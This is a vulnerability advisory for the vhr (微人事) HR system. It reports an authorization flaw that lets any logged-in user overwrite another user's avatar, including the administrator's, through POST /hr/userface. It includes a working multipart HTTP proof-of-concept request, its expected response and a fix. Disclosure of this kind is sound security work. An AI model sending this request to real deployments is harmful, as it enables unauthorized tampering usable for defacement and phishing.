# vhr（微人事） — IDOR in POST /hr/userface (VHR-VULN-010)

| Field | Value |
|-------|-------|
| **Vendor** | lenve |
| **Product** | vhr（微人事） |
| **Version** | 1.0-SNAPSHOT |
| **Type** | Improper Authorization |
| **CWE** | CWE-285 |
| **Authentication** | Any logged-in user |

## Summary

Multipart `id` field targets arbitrary user avatar without ownership validation.

## Root cause

`HrInfoController.userface()` updates `userface` for supplied `id`.

## Proof of Concept

```http
POST /hr/userface HTTP/1.1
Host: TARGET
Content-Type: multipart/form-data; boundary=----BOUNDARY
Cookie: JSESSIONID=SESSION_LIBAI
Connection: close

------BOUNDARY
Content-Disposition: form-data; name="id"

3
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="poc.jpg"
Content-Type: image/jpeg

(binary)
------BOUNDARY--
```

**Expected:** {"status":200,"msg":"更新成功!"} for id=3 (admin)

## Impact

Defacement / phishing via swapped avatars.

## Remediation

Bind upload target to session user id.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §VHR-VULN-010
- PoC: `POC_VERIFICATION_REPORT.md`
